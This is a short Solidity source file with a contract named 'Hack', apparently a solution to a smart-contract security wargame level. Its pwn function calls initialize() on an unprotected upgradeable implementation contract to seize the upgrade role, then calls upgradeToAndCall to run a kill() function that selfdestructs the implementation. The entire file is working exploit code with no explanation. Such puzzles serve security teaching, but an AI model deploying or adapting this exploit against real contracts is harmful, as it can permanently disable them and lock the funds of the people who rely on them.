// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns(address);
}

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(
            address(this), 
            abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}